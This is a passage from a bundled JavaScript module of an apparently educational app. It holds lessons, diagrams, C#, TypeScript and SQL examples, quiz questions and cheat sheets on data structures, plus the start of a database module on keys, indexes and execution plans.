"O(1) **amortized**" instead of simply O(1)?',choices:["It is O(1) only for value types such as `int`, not for classes","When full, it copies to a bigger array — rare, so the average is cheap","After 1,000 items every Add copies the whole array, so it is O(n)","The resize work runs on a background thread, so Add never waits"],answer:1,why:"Most Adds just write into a free slot. Sometimes the inner array is full and must be copied (O(n)). Because the size doubles, this is rare. So the average cost per Add stays O(1). That is what **amortized** means: the average over many calls.",remember:"Know the size? `new List<T>(capacity)` skips the copies."}]},{id:"data-structures.hashmap-set",title:"Dictionary / HashMap and Set",summary:"Know the key, get the value — fast.",minutes:5,blocks:[{type:"text",text:`A **Dictionary** (also called HashMap or Map) stores **key → value** pairs.
Think of a real dictionary: if you know the word (key), you find the meaning (value) fast. You do not read every page.`},{type:"diagram",text:`key       hash()        bucket
"alice" ──────────────► [3] → ("alice", 42)
"bob"   ──────────────► [7] → ("bob", 17)
"carol" ──────────────► [1] → ("carol", 8)

get("bob"): hash → bucket 7 → found. No scanning.`},{type:"text",text:"A **hash function** turns the key into a number that says where to look. That place is called a **bucket**. So get, add and remove are **O(1) on average**. They take about the same time for 10 items or 10 million."},{type:"code",code:{lang:"csharp",text:`var users = new Dictionary<int, User>();
users[42] = alice;                        // add or replace
if (users.TryGetValue(42, out var u)) { } // O(1) average

var seen = new HashSet<string>();
seen.Add("a@x.com");   // true  → added
seen.Add("a@x.com");   // false → already there`}},{type:"code",code:{lang:"ts",text:`const prices = new Map<string, number>();
prices.set('apple', 3);
prices.get('apple');            // 3, O(1) average

const tags = new Set(['js', 'ts', 'js']);
tags.size;                      // 2 — duplicate removed
tags.has('ts');                 // true, O(1) average`}},{type:"text",text:'A **Set** (`HashSet<T>`, JS `Set`) is like a dictionary with only keys. Use it for "have I seen this?" and to remove duplicates.'},{type:"compare",left:{title:"Use it when ✅",items:["You find things by id, email, code…",'You ask "have I seen this before?"',"You remove duplicates","You group or count items by a key"]},right:{title:"Watch out ⚠️",items:["Uses more memory than a plain list","C# Dictionary/HashSet: order is not guaranteed","Never change a key after adding it","Object keys: equal content ≠ equal key"]}},{type:"example",title:"Real world",text:"A cache of users by id. Counting words in a log (`word → count`). Feature flags by name. Skipping rows you already imported."}],remember:'HashMap = fast lookup by key. Set = fast "is it here?". Both O(1) on average.',questions:[{id:"data-structures.hashmap-set.1",kind:"scenario",difficulty:"easy",prompt:'You import 100,000 customer rows. You must skip any row whose email already appeared earlier in the same file. What is the best way to track "emails already seen"?',choices:["A `HashSet<string>` of emails","A `List<string>` plus `Contains`","A `Stack<string>` of emails","A `string[]` sorted after each row"],answer:0,why:"`HashSet.Add` returns false when the email is already there, in O(1) on average. A list would scan up to 100,000 emails for every row."},{id:"data-structures.hashmap-set.2",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"ts",text:`const a = { id: 1 };
const b = { id: 1 };
const set = new Set([a, b, a]);
console.log(set.size);`},choices:["1","3","2","It throws an error"],answer:2,why:"JS `Set` and `Map` compare objects by **reference**. `a` and `b` look the same but are two different objects, so both stay. The second `a` is a real duplicate and is dropped.",remember:"For objects, use the id as the key: `new Map(items.map(x => [x.id, x]))`."},{id:"data-structures.hashmap-set.3",kind:"debug",difficulty:"hard",prompt:'You use a C# **class** `OrderKey` with `Region` and `Year` as a Dictionary key. It does not override `Equals` or `GetHashCode`. `dict[new OrderKey("EU", 2026)]` throws `KeyNotFoundException`, but you added a key with the same values. Why?',choices:["Dictionary keys can only be strings or ints","The dictionary reached its maximum capacity","The class compares by reference, not by values","You must call `ContainsKey` before the indexer"],answer:2,why:"A plain class uses reference equality: two keys are equal only if they are the same object. So a new object with the same values is a different key. Use a `record`, a tuple key like `(string, int)`, or override `Equals` and `GetHashCode`.",remember:"Custom key → define equality (record / tuple / override)."},{id:"data-structures.hashmap-set.4",kind:"mcq",difficulty:"medium",prompt:'Dictionary lookup is "O(1) on average". When can it become much slower?',choices:["When the values are large objects","When many keys produce the same hash code","When the keys are strings","When you read the same key twice"],answer:1,why:"Keys with the same hash go into the same bucket. The dictionary must then compare them one by one. A bad custom `GetHashCode` (for example, always returning 0) turns every lookup into O(n)."}]},{id:"data-structures.stack-queue",title:"Stack and Queue",summary:"A pile of plates and a coffee line.",minutes:3,blocks:[{type:"text",text:"A **Stack** is a pile of plates. You put a plate on top (**push**) and take from the top (**pop**). Last in, first out: **LIFO**."},{type:"text",text:"A **Queue** is a line at a coffee shop. People join at the back (**enqueue**) and leave from the front (**dequeue**). First in, first out: **FIFO**."},{type:"diagram",text:`Stack (LIFO)           Queue (FIFO)

 push ↓   ↑ pop        in → [D][C][B][A] → out
    ┌───┐                   back     front
    │ C │ ← top
    │ B │               A came first,
    │ A │               A leaves first
    └───┘
C came last, C leaves first`},{type:"code",code:{lang:"csharp",text:`var undo = new Stack<string>();
undo.Push("type 'a'");
undo.Push("delete line");
undo.Pop();       // "delete line" — the last action

var jobs = new Queue<Email>();
jobs.Enqueue(welcomeMail);
jobs.Enqueue(resetMail);
jobs.Dequeue();   // welcomeMail — the first one in
// Push, Pop, Enqueue, Dequeue, Peek: all O(1)`}},{type:"compare",left:{title:"Stack — real world",items:["Undo / redo","Browser Back button","The call stack (each method call)","Matching brackets `{[()]}`","Depth-first search"]},right:{title:"Queue — real world",items:["Background jobs","Message queues (RabbitMQ, Service Bus)","Print queue","Requests waiting for a worker","Breadth-first search"]}},{type:"text",text:"JS/TS has no built-in queue. `push` + `pop` on an array is a fine stack. But `shift()` takes from the front, and engines usually move all the other items → O(n). For big queues, do not call `shift()`. Keep an index that points to the front item instead."}],remember:"Stack = plates, last in first out. Queue = coffee line, first in first out.",questions:[{id:"data-structures.stack-queue.1",kind:"scenario",difficulty:"easy",prompt:"You build **Undo** for a drawing app. Every user action is saved. Undo must reverse the most recent action first, then the one before it. Which structure fits?",choices:["Queue","HashSet","Stack","Sorted list"],answer:2,why:'"Most recent first" is last in, first out. Push each action; Undo pops the top one.'},{id:"data-structures.stack-queue.2",kind:"code",difficulty:"medium",prompt:"This worker processes 200,000 jobs and is much slower than expected. What is the most likely reason?",code:{lang:"ts",text:`const queue: Job[] = loadJobs(); // 200,000 jobs
while (queue.length > 0) {
  const job = queue.shift()!;
  process(job);
}`},choices:["while loops are slow in JS engines","`queue.length` counts all items every time","`shift()` moves the remaining items each time → O(n²)","The `!` operator makes a copy of each job"],answer:2,why:"Removing from the front of a large array usually shifts every other item down. Done 200,000 times, that is O(n²). Loop with an index (`for (let i = 0; ...)`) or use a real queue.",remember:"JS: `pop()` is cheap, `shift()` on big arrays is not."},{id:"data-structures.stack-queue.3",kind:"debug",difficulty:"hard",prompt:"A recursive C# method walks a folder tree. On one customer's data (folders nested 200,000 levels deep) the whole process crashes with `StackOverflowException`. What is the usual fix?",choices:["Wrap the call in `try/catch (StackOverflowException)`","Run it on a server with more CPU","Make the method `async` so it uses less stack","Replace recursion with a loop and an explicit `Stack<T>`"],answer:3,why:"Each recursive call uses space on the call stack, which is small. In .NET a stack overflow cannot be caught — the process dies. A loop with your own `Stack<T>` keeps the waiting work on the heap. The heap is much bigger.",remember:"Very deep recursion → loop + explicit Stack<T>."}]},{id:"data-structures.linked-list",title:"Linked List",summary:"A chain of nodes — great at one thing, slow at most.",minutes:3,blocks:[{type:"text",text:"A **linked list** is a chain. Each item (a **node**) holds a value and a pointer to the next node. The nodes can live anywhere in memory."},{type:"diagram",text:`head
 │
 ▼
┌───┬───┐   ┌───┬───┐   ┌───┬──────┐
│ A │ ●─┼──►│ B │ ●─┼──►│ C │ null │
└───┴───┘   └───┴───┘   └───┴──────┘

Insert X after A → change 2 pointers, nothing moves:
┌───┬───┐   ┌───┬───┐   ┌───┬───┐
│ A │ ●─┼──►│ X │ ●─┼──►│ B │ ●─┼──► C
└───┴───┘   └───┴───┘   └───┴───┘`},{type:"text",text:`The good part: if you already **hold** a node, inserting or removing next to it is O(1). Nothing shifts.
The bad part: there is no index. To reach item 500 you walk 500 steps → O(n). Searching is O(n) too.`},{type:"text",text:"In C#, `LinkedList<T>` is doubly linked: each node points to the next **and** the previous one. JS has no built-in linked list."},{type:"compare",left:{title:"Good at ✅",items:["Add/remove at the front or end: O(1)","Add/remove next to a node you hold: O(1)","Moving a node to the front (LRU caches)"]},right:{title:"Bad at ⚠️",items:["Get item by position: O(n)","Search: O(n)","Extra memory per node for pointers","Slow loops: nodes are spread around memory"]}},{type:"example",title:"Where you actually meet it",text:'An **LRU cache** ("drop the least recently used item") uses a Dictionary to find a node in O(1). It also uses a linked list to move that node to the front in O(1).\nIn everyday app code, `List<T>` is usually faster. Its items sit side by side in memory, and that is very fast to read.'}],remember:"Linked list = chain. O(1) next to a node you hold, O(n) to find anything. Rarely your first choice.",questions:[{id:"data-structures.linked-list.1",kind:"truefalse",difficulty:"easy",prompt:"Inserting into a linked list is O(1), so inserting at **position 5,000** of a `LinkedList<T>` is also O(1).",choices:["True","False"],answer:1,why:"The insert itself is O(1), but first you must walk 5,000 nodes to reach that position. That walk is O(n).",remember:"O(1) insert only when you already hold the node."},{id:"data-structures.linked-list.2",kind:"compare",difficulty:"medium",prompt:'You keep 10,000 items. You loop over them often, sometimes read by index, and rarely insert (mostly at the end). A teammate says "use LinkedList, inserts are O(1)". Which is better here?',choices:["`List<T>`","`LinkedList<T>`"],answer:0,why:"The work here is loops, index reads and adds at the end. A list does all of these well. In a linked list, index reads are O(n). Its loops are also slower, because the nodes are spread around memory."},{id:"data-structures.linked-list.3",kind:"scenario",difficulty:"hard",prompt:"You build an LRU cache for 10,000 items. `Get(key)` must be fast and mark the item as most recently used. When full, the least recently used item is dropped. Which design gives O(1) for both?",choices:["A `List<T>` kept sorted by last-used time","A Dictionary of nodes + a doubly linked list","A single `Queue<T>` of keys","A `SortedDictionary` keyed by timestamp"],answer:1,why:"The dictionary finds the node in O(1). The linked list moves that node to the front, and removes the last node (the tail), in O(1). A queue cannot move an item from the middle. A sorted structure costs O(n) or O(log n)."}]},{id:"data-structures.tree-heap",title:"Tree and Heap",summary:'Sorted data, and "who is next?".',minutes:5,blocks:[{type:"text",text:"A **tree** is items connected parent → children. There is one root at the top and no loops. You use trees every day: folders, the HTML DOM, JSON, an org chart, menu categories."},{type:"diagram",text:`            /
      ┌─────┴─────┐
     src         docs
   ┌──┴───┐       │
 app.ts   ui/  readme.md`},{type:"text",text:"A **binary search tree** keeps keys sorted: smaller keys go left, bigger keys go right. Each step down throws away half → **O(log n)**. This works only while the tree stays **balanced**. Balanced means the left and right sides have about the same height."},{type:"diagram",text:`        50            find 65:
      ┌──┴──┐         50 → bigger, go right
     30     70        70 → smaller, go left
    ┌┴┐    ┌┴┐        65 → found in 3 steps
   20 40  65 90`},{type:"text",text:"You rarely write one yourself. In C#, `SortedDictionary<K,V>` and `SortedSet<T>` are balanced trees. Add, remove and find are O(log n), and items always come out **sorted**. A plain `Dictionary` is faster (O(1)) but has no order. Database indexes are also trees (B-trees) for the same reason."},{type:"text",text:'A **heap** is a tree with one promise: the **smallest** (or largest) item is always on top. It is **not** fully sorted. It only knows "who is first".'},{type:"diagram",text:`min-heap: parent ≤ children

       2          Peek()    → 2         O(1)
     ┌─┴─┐        Dequeue() → 2, fix    O(log n)
     5   3        Enqueue() → add, fix  O(log n)
   ┌─┴─┐
   9   7`},{type:"code",code:{lang:"csharp",text:`// .NET 6+: PriorityQueue is a min-heap.
// The LOWEST priority value comes out first.
var pq = new PriorityQueue<string, int>();
pq.Enqueue("send newsletter", 5);
pq.Enqueue("charge card", 1);
pq.Enqueue("resize image", 3);
pq.Dequeue();   // "charge card" (priority 1)`}},{type:"text",text:"JS/TS has no built-in heap. Use a small library, or just sort if the data is small and rarely changes."},{type:"compare",left:{title:"Sorted tree ✅",items:["Items must stay in sorted order",'Range queries: "keys from A to F"',"SortedDictionary / SortedSet: O(log n)"]},right:{title:"Heap ✅",items:["You only need the next smallest/biggest","Job scheduling, top-K (the K best), shortest path","PriorityQueue: O(log n) add/remove"]}}],remember:'Tree = sorted, O(log n) when balanced. Heap = "who is next?" fast, not fully sorted.',questions:[{id:"data-structures.tree-heap.1",kind:"scenario",difficulty:"medium",prompt:"A game must always know the **top 10 scores** among 5 million players. New scores arrive all the time. What is the best way to keep the current top 10?",choices:["A min-heap holding only the 10 best scores","Re-sort all 5 million scores on each new score","A `Stack<int>` of every score ever received","A `HashSet<int>` of all distinct scores"],answer:0,why:"The top of the heap is the smallest of the best 10. If a new score is bigger, remove the top and add the new one: O(log 10). Re-sorting 5 million items every time is O(n log n) per score.",remember:"Top-K → heap of size K."},{id:"data-structures.tree-heap.2",kind:"mcq",difficulty:"medium",prompt:"You map date → event. You often print all events **in date order**, and you also add and remove events. Which C# type fits best?",choices:["`Dictionary<DateTime, Event>`","`HashSet<Event>`","`Queue<Event>`","`SortedDictionary<DateTime, Event>`"],answer:3,why:"`SortedDictionary` keeps keys sorted all the time, with O(log n) add/remove. A `Dictionary` has no guaranteed order, so you would sort on every print."},{id:"data-structures.tree-heap.3",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"csharp",text:`var pq = new PriorityQueue<string, int>();
pq.Enqueue("B", 2);
pq.Enqueue("A", 9);
pq.Enqueue("C", 1);
Console.WriteLine(pq.Dequeue());`},choices:["B","A","C","It throws an exception"],answer:2,why:"`PriorityQueue` is a min-heap: the item with the lowest priority value (1) comes out first. Insert order does not matter — it is not FIFO."},{id:"data-structures.tree-heap.4",kind:"debug",difficulty:"hard",prompt:"A home-made binary search tree is fast in tests with random ids. In production, ids arrive in increasing order (1, 2, 3, …) and lookups become very slow. Why?",choices:["Comparing bigger integers takes more time","Each new node goes right, so the tree becomes a long chain","Trees must be rebuilt after 1 million inserts","The garbage collector keeps moving the nodes"],answer:1,why:'Without balancing, sorted input makes every node the right child of the last one. The "tree" is really a linked list, so lookups are O(n). Built-in sorted collections balance themselves, so this does not happen.',remember:"Unbalanced tree + sorted input = linked list."}]},{id:"data-structures.graph",title:"Graph",summary:"Things and the connections between them.",minutes:5,blocks:[{type:"text",text:"A **graph** is things (**nodes**) plus connections (**edges**). Unlike a tree, a graph can have **cycles** (loops) and many paths between two nodes."},{type:"diagram",text:`  Ana ───── Ben
   │      ╱  │
   │    ╱    │
  Cy ───── Dee ───── Eve

undirected: friendship goes both ways
directed:   A → B ("A follows B", "A needs B")`},{type:"list",items:['Social network: people + "follows"',"Maps: places + roads, with distance as the edge **weight**","Package dependencies: A needs B, B needs C","Microservices calling each other"]},{type:"text",text:"In code, you usually store a graph as an **adjacency list**. That is a dictionary from each node to its neighbours."},{type:"code",code:{lang:"csharp",text:`var friends = new Dictionary<string, List<string>>
{
    ["Ana"] = new List<string> { "Ben", "Cy" },
    ["Ben"] = new List<string> { "Ana", "Cy", "Dee" },
    // ...
};`}},{type:"list",items:["**BFS** (breadth-first): visit all neighbours, then their neighbours. Uses a **queue**. Finds the shortest path when every edge costs the same.",'**DFS** (depth-first): go as deep as you can, then go back. Uses a **stack** (or recursion). Good for "can I reach X?" and finding cycles.',"Always keep a **visited** set. Graphs can have cycles. Without it, you loop forever."]},{type:"code",code:{lang:"ts",text:`function reachable(start: string, graph: Map<string, string[]>) {
  const visited = new Set([start]);
  const queue = [start];
  for (let i = 0; i < queue.length; i++) {   // BFS
    for (const next of graph.get(queue[i]) ?? []) {
      if (!visited.has(next)) {
        visited.add(next);
        queue.push(next);
      }
    }
  }
  return visited;
}`}},{type:"example",title:"Dependency order",text:'A build tool must build B before A when A needs B. Ordering nodes so every arrow points forward is a **topological sort**. If there is a cycle (A → B → A), no valid order exists. That is the "circular dependency" error you have seen.'}],remember:"Graph = nodes + edges, may have cycles. BFS uses a queue, DFS a stack. Always track visited.",questions:[{id:"data-structures.graph.1",kind:"debug",difficulty:"medium",prompt:`A job follows "user referred user" links to build referral chains. On one customer's data it never finishes and memory keeps growing. What is the most likely cause?`,choices:["Dictionary lookups slow down over time","A cycle in the data, and no visited set","Graphs cannot hold more than 10,000 nodes","BFS only works on trees, not graphs"],answer:1,why:"Say A referred B, and (because of a data bug) B also referred A. The walk goes in a circle and adds the same nodes again and again. A visited set stops it the second time it meets a node.",remember:"Walking a graph? Track visited."},{id:"data-structures.graph.2",kind:"scenario",difficulty:"medium",prompt:"A professional network shows whether someone is a 1st, 2nd or 3rd degree connection. Which way of walking the graph fits best?",choices:["BFS, because it explores level by level","DFS, because it goes deep first","Sort all users by name, then search","Binary search on the user ids"],answer:0,why:"BFS visits all direct friends (level 1), then their friends (level 2), and so on. The level where you first meet a person is their degree. DFS may reach them first by a long path, so the level is wrong."},{id:"data-structures.graph.3",kind:"mcq",difficulty:"easy",prompt:'Your DI container fails with "Circular dependency: `OrderService` → `PaymentService` → `OrderService`". In graph terms, what did it find?',choices:["A node with no edges","A tree that is too deep","Two nodes with the same name","A cycle in a directed graph"],answer:3,why:'Services are nodes and "needs" is a directed edge. Following the edges brings you back to the start: a cycle. No creation order can satisfy it.'},{id:"data-structures.graph.4",kind:"compare",difficulty:"hard",prompt:"You store a road graph with 1 million nodes. Each node has about 10 edges. Which storage is realistic?",choices:["A 1,000,000 × 1,000,000 grid of true/false","Each node keeps a list of its neighbours"],answer:1,why:'The grid (adjacency matrix) has a trillion cells, almost all "false". That is far too much memory. The adjacency list stores only the ~10 million real edges.',remember:"Few edges per node → adjacency list."}]},{id:"data-structures.choosing",title:"Picking the right structure",summary:"Start from the question your code asks most.",minutes:3,blocks:[{type:"text",text:"Most real code needs only a few structures. Ask: **what question does my code ask most often?**"},{type:"diagram",text:`"Give me item #i" / loop in order → List / Array
"Find by key (id, email)"         → Dictionary / Map
"Seen it?" / no duplicates        → HashSet / Set
"Last thing added?" (undo)        → Stack
"First thing added?" (jobs)       → Queue
"Smallest / most urgent next?"    → PriorityQueue
"Keep it sorted by key"           → SortedDictionary
"Who connects to whom?"           → Graph`},{type:"text",text:"It is normal to **combine** them. One list for display order, plus one dictionary for lookups by id. You pay a bit of memory to make both operations fast."},{type:"example",title:"Real example",text:"An import reads 200,000 rows and needs the customer for each row. Loading 50,000 customers into a `Dictionary<int, Customer>` once is O(n), then each lookup is O(1).\nCalling `customers.First(c => c.Id == row.CustomerId)` per row instead can mean 200,000 × 50,000 = 10 billion comparisons."},{type:"text",text:"Also ask: **how big will this be in production?** 50 items → almost anything is fine. 5 million → the choice really matters."},{type:"text",text:"Careful: switching structure can change **behaviour**, not only speed. A Set drops equal items. A C# Dictionary does not promise order. A heap is not sorted when you loop over it."}],remember:'Pick by the main question: by position, by key, "seen it?", next in line, or smallest next.',questions:[{id:"data-structures.choosing.1",kind:"scenario",difficulty:"medium",prompt:'An admin page shows 20,000 products in a custom order chosen by the admin. The cart code often needs "get product by SKU". What should you keep in memory?',choices:["Only a `List<Product>`, searched by SKU each time","Only a `Dictionary<string, Product>`, order ignored","A `Stack<Product>` that serves both needs","A List for the order plus a Dictionary by SKU"],answer:3,why:'There are two different questions: "in what order?" and "which product has this SKU?". A list answers the first, a dictionary the second. Both point to the same objects, so the extra memory is small.'},{id:"data-structures.choosing.2",kind:"perf",difficulty:"medium",prompt:"A scheduler must always run the job with the earliest `RunAt` next. Thousands of jobs are added per minute. Current code: add to a `List<Job>`, then `jobs.OrderBy(j => j.RunAt).First()` each time. What is the best change?",choices:["Use a `Queue<Job>` — first in, first out","Use a `PriorityQueue<Job, DateTime>`","Keep the list, but call `Sort()` instead of `OrderBy`","Use a `HashSet<Job>` for O(1) access"],answer:1,why:"Sorting the whole list to get one item is O(n log n) every time. A heap gives the earliest job in O(log n). A plain Queue is ordered by insert time, not by `RunAt`.",remember:'"Smallest next", again and again → PriorityQueue.'},{id:"data-structures.choosing.3",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"csharp",text:`var tags = new[] { "js", "JS", "ts", "js" };
var set = new HashSet<string>(tags,
    StringComparer.OrdinalIgnoreCase);
Console.WriteLine(set.Count);`},choices:["4","3","2","1"],answer:2,why:'The comparer ignores case, so "js" and "JS" are the same item. The set holds "js" and "ts" → 2. Without the comparer it would be 3.',remember:'A Set uses its comparer to decide what "equal" means.'},{id:"data-structures.choosing.4",kind:"debug",difficulty:"hard",prompt:"To speed up `Contains`, you change `List<OrderLine>` to `HashSet<OrderLine>`. `OrderLine` is a `record (string Sku, int Qty)`. QA reports that an order with two identical lines now shows only one line. Why?",choices:["A set keeps only one copy of equal items","HashSet sorts the items and drops the last one","Records cannot be stored in a HashSet","HashSet allows only one item per Sku value"],answer:0,why:"Records compare by value, so two lines with the same Sku and Qty are equal. A set keeps one of them. The new structure changed the meaning of the data, not only the speed.",remember:"Changing List → Set changes behaviour: duplicates disappear."}]}],cheatSheet:[{title:"Big-O by structure",items:[{term:"List<T> / Array",meaning:"By index O(1) · add at end O(1)* · insert/remove at front O(n) · Contains O(n)"},{term:"Dictionary / Map",meaning:"Get, add, remove by key O(1) average"},{term:"HashSet / Set",meaning:"Add, Contains / has, Remove O(1) average · no duplicates"},{term:"Stack<T>",meaning:"Push / Pop / Peek O(1) · last in, first out"},{term:"Queue<T>",meaning:"Enqueue / Dequeue O(1) · first in, first out"},{term:"LinkedList<T>",meaning:"Add/remove next to a node you hold O(1) · find or by index O(n)"},{term:"SortedDictionary / SortedSet",meaning:"Add, remove, find O(log n) · always sorted"},{term:"PriorityQueue<T, P>",meaning:"Enqueue / Dequeue O(log n) · Peek O(1) · lowest priority first"},{term:"* amortized",meaning:"Cheap on average: usually instant, but sometimes copies everything into a bigger array"}]},{title:"Pick by the question",items:[{term:"By position / in order",meaning:"List<T>, Array"},{term:"By key",meaning:"Dictionary<K,V>, Map"},{term:"Seen it? / no duplicates",meaning:"HashSet<T>, Set"},{term:"Last in, first out",meaning:"Stack<T>, or array push / pop"},{term:"First in, first out",meaning:"Queue<T> (JS: avoid shift() on big arrays)"},{term:"Smallest / most urgent next",meaning:"PriorityQueue (heap)"},{term:"Sorted by key, ranges",meaning:"SortedDictionary, SortedSet"},{term:"Connections",meaning:"Graph: Dictionary<node, List<node>>"}]},{title:"Common traps",items:[{term:"JS Set / Map with objects",meaning:"Compares by reference, not content — key by id"},{term:"C# class as a key",meaning:"Use a record / tuple, or override Equals + GetHashCode"},{term:"C# Dictionary order",meaning:"Not guaranteed — sort, or use SortedDictionary"},{term:"Changing a key",meaning:"Never change a key object after adding it to a Dictionary / Set"},{term:"Array shift() in a loop",meaning:"Usually O(n) each → O(n²) total"},{term:"Graph walk",meaning:"Always keep a visited set — cycles!"},{term:"Very deep recursion",meaning:"Stack overflow → loop + explicit Stack<T>"}]}]},I=Object.freeze(Object.defineProperty({__proto__:null,default:x},Symbol.toStringTag,{value:"Module"})),A={id:"database",title:"Database",emoji:"🗄️",tagline:"Indexes, plans, locks — why queries get slow",lessons:[{id:"database.keys",title:"Tables, primary keys and foreign keys",summary:"How rows are identified and linked.",minutes:3,blocks:[{type:"text",text:`A **table** stores rows. Every row has the same columns.
A **primary key** (PK) is the column that identifies one row. It must be unique and never empty.`},{type:"diagram",text:`Customers                 Orders
┌────┬───────┐           ┌────┬────────────┬───────┐
│ Id │ Name  │           │ Id │ CustomerId │ Total │
├────┼───────┤           ├────┼────────────┼───────┤
│ 1  │ Alice │ ◄──────── │ 10 │ 1          │ 50    │
│ 2  │ Bob   │ ◄──┐      │ 11 │ 1          │ 20    │
└────┴───────┘    └───── │ 12 │ 2          │ 75    │
   PK = Id               └────┴────────────┴───────┘
                            FK = CustomerId → Customers.Id`},{type:"text",text:'A **foreign key** (FK) says: "this value must exist in that other table". The database will reject an order for customer 99 if customer 99 does not exist.'},{type:"example",title:"Why it matters",text:"Without the FK, a bug can create orders that point to nobody. Reports then show money that belongs to no customer, and nobody notices for months."},{type:"text",text:"Tip: a foreign key does **not** automatically create an index in SQL Server. If you often query `WHERE CustomerId = @id`, you usually want an index on `CustomerId` too."}],remember:'PK = "which row is this?" FK = "this must point to a real row."',questions:[{id:"database.keys.1",kind:"mcq",difficulty:"easy",prompt:"What is the main job of a primary key?",choices:["Make the table load faster in the UI","Uniquely identify each row","Sort the rows alphabetically","Encrypt the row"],answer:1,why:"A primary key gives every row a unique identity, so you can find, update or reference exactly one row.",remember:"PK = unique identity of a row."},{id:"database.keys.2",kind:"scenario",difficulty:"medium",prompt:"Your `Orders` table has a `CustomerId` column but no foreign key. Someone deletes a customer. What can happen?",choices:["The orders are deleted too, because the column names match","The orders stay and point to a customer that no longer exists","The database refuses the delete, because orders still use it","The CustomerId of those orders is set to NULL automatically"],answer:1,why:'Without a foreign key the database does not know the two tables are related. The delete succeeds. The orders become "orphans": rows that point to a parent that no longer exists.',remember:"No FK → orphan rows are possible."},{id:"database.keys.3",kind:"truefalse",difficulty:"medium",prompt:"In SQL Server, creating a foreign key on `Orders.CustomerId` also creates an index on that column.",choices:["True","False"],answer:1,why:"SQL Server creates an index for primary keys and unique constraints, but not for foreign keys. You add that index yourself if you query by the FK."}]},{id:"database.index",title:"Index: the book index",summary:"Find rows without reading the whole table.",minutes:4,blocks:[{type:"text",text:`Imagine a 900-page book. You want the page about "deadlock".
Without an index you read every page. With the index at the back, you jump straight to page 412.`},{type:"text",text:"A database **index** works the same way. It is a sorted copy of some columns, plus a pointer to the full row."},{type:"diagram",text:`Index on CustomerId            Orders table (20 million rows)
┌────────────┬──────┐
│ CustomerId │ Row  │
├────────────┼──────┤
│ 122        │ ...  │
│ 123        │ ●────┼──────►  row #8 201 553
│ 123        │ ●────┼──────►  row #15 002 004
│ 124        │ ...  │
└────────────┴──────┘
 sorted → find 123 in a few steps`},{type:"compare",left:{title:"Index Seek ✅",items:["Jump to the matching keys","Reads few pages","Like using the book index"]},right:{title:"Index / Table Scan ⚠️",items:["Read many or all entries","Reads many pages","Like reading the whole book"]}},{type:"text",text:"Indexes are not free. Every `INSERT`, `UPDATE` and `DELETE` must also update each index. A table with 15 indexes is fast to read and slow to write."},{type:"code",code:{lang:"sql",text:`-- Query
SELECT Id, Total
FROM Orders
WHERE CustomerId = 123;

-- Index that lets SQL Server seek.
-- INCLUDE stores Total in the index too, so no table lookup.
CREATE INDEX IX_Orders_CustomerId
  ON Orders (CustomerId) INCLUDE (Total);`}}],remember:"Index = book index. Seek = jump. Scan = read a lot.",questions:[{id:"database.index.1",kind:"perf",difficulty:"easy",prompt:"`SELECT * FROM Orders WHERE CustomerId = 123` is slow. The table has 20 million rows. What would you check first?",choices:["Increase the connection pool size in the API settings","Whether there is a good index on CustomerId","Add more API servers behind the load balancer","Add more CSS"],answer:1,why:"Without an index on CustomerId the database must scan all 20 million rows to find the matching ones. An index lets it jump to them.",remember:"Slow filter on a big table → check the index first."},{id:"database.index.2",kind:"mcq",difficulty:"easy",prompt:"In an execution plan, what is the usual difference between an **Index Seek** and an **Index Scan**?",choices:["Seek reads the whole index, Scan jumps only to matching entries","Seek jumps to matching entries, Scan reads many or all entries","They are the same; the plan just uses two names for one step","Seek is used only for primary keys, Scan for all other indexes"],answer:1,why:"A seek uses the sorted order to go straight to the matching keys. A scan reads through a large part of the index."},{id:"database.index.3",kind:"scenario",difficulty:"medium",prompt:"A teammate wants to add an index on every column of a table that receives 5,000 inserts per second. What is the main risk?",choices:["Reads get slower, because the database must check too many indexes","Writes get slower, because each insert must update every index","The table can no longer have a primary key or a clustered index","No real risk, because indexes only use disk space, not CPU time"],answer:1,why:"The database must keep each index up to date. On a table with many writes, many indexes multiply the work of every insert. They also use more storage.",remember:"Indexes speed up reads and slow down writes."},{id:"database.index.4",kind:"code",difficulty:"hard",prompt:"There is an index on `CreatedAt`. Which query is most likely to **prevent** an index seek?",code:{lang:"sql",text:`-- A
WHERE CreatedAt >= '2026-01-01' AND CreatedAt < '2026-02-01'
-- B
WHERE YEAR(CreatedAt) = 2026 AND MONTH(CreatedAt) = 1`},choices:["A","B","Both are the same","Neither can use the index"],answer:1,why:"B wraps the column in functions. Now the database cannot use the sorted index directly, so it usually scans. A compares the raw column to a range, which allows a seek.",remember:"Do not wrap an indexed column in a function in WHERE."}]},{id:"database.plan",title:"Execution plans and logical reads",summary:"See what the database actually did.",minutes:4,blocks:[{type:"text",text:"You write **what** you want (SQL). The database decides **how** to get it. That decision is the **execution plan**. The part of the database that makes this decision is the **optimizer**."},{type:"diagram",text:`SQL text
   ↓
Optimizer: "Seek or scan? Which join? Which order?"
   ↓
Execution plan  ← you can read this
   ↓
Rows`},{type:"list",items:['**Logical reads** — 8 KB pages read from memory (the buffer cache). The best simple measure of "how much data did this query touch?"',"**Physical reads** — pages that had to come from disk because they were not in memory yet. Slower.","**CPU time** — time spent computing: sorting, hashing, functions.","**IO** — reading and writing pages. Often the real cost of a bad query."]},{type:"code",code:{lang:"sql",text:`SET STATISTICS IO, TIME ON;
SELECT Id, Total FROM Orders WHERE CustomerId = 123;
-- Table 'Orders'. Scan count 1, logical reads 4
--   → good: only 4 pages
-- Table 'Orders'. Scan count 1, logical reads 182 000
--   → bad: the query touched ~1.4 GB of pages`}},{type:"text",text:"Physical reads go down when you run the query again (the pages are now cached). Logical reads stay the same. That is why logical reads are better for comparing two versions of a query."}],remember:'Compare queries by logical reads, not by "it felt faster the second time".',questions:[{id:"database.plan.1",kind:"debug",difficulty:"medium",prompt:"Your API suddenly becomes slow. App CPU is only 20%, but database logical reads for one query are 10× higher than normal. What would you check?",choices:["The JSON serializer in the API, since big responses slow it down","The query's execution plan — it may have changed from seek to scan","Increase the connection pool size so more queries can run at once","Add more API servers so the load is spread across more machines"],answer:1,why:"10× more logical reads means the query touches far more data. The usual cause is a changed plan. For example: a missing index, old statistics or different parameters.",remember:"Reads jumped → look at the plan."},{id:"database.plan.2",kind:"mcq",difficulty:"medium",prompt:"You run the same query twice. Physical reads drop from 5,000 to 0. Logical reads stay at 5,000. Why?",choices:["The optimizer learned from the first run and chose a better plan","The pages are now in memory; the query still reads the same 